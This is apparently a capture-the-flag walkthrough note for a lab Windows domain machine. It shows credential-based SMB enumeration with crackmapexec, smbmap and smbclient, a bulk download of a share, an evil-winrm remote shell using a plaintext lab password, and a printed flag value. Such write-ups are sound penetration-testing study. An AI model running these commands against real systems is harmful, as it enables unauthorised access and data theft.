
We have some things we can do with a user and password and we don't know what privileges does it have.

- [ ] smb
- [ ] secretsdump
- [ ] crackmapexec
- [ ] ldapdump


```
crackmapexec smb 10.10.10.175 -u fsmith -p 'Thestrokes23' --shares
```
![[Pasted image 20240501055403.png]]

To get more better understanding
```
smbmap -u fsmith -d EGOTISTICALBANK.local -p 'Thestrokes23' -H 10.10.10.175
```
![[Pasted image 20240501062507.png]]



```
smbclient //10.10.10.175/print$ -U 'fsmith' --password 'Thestrokes23'
```
![[Pasted image 20240501055725.png]]

It seems interesting so let's enumerate
![[Pasted image 20240501055840.png]]


![[Pasted image 20240501060920.png]]


```
prompt off
recurse on
ls
mget *
```

We don't have write access but  but  but

Always try to run this command before doing anything
```
evil-winrm -u fsmith -p 'Thestrokes23' -i 10.10.10.175
```
![[Pasted image 20240502020038.png]]

![[Pasted image 20240502020250.png]]

Will get the flag first
```
b832998718ccc6b402516022d19a41be
```
![[Pasted image 20240502020516.png]]
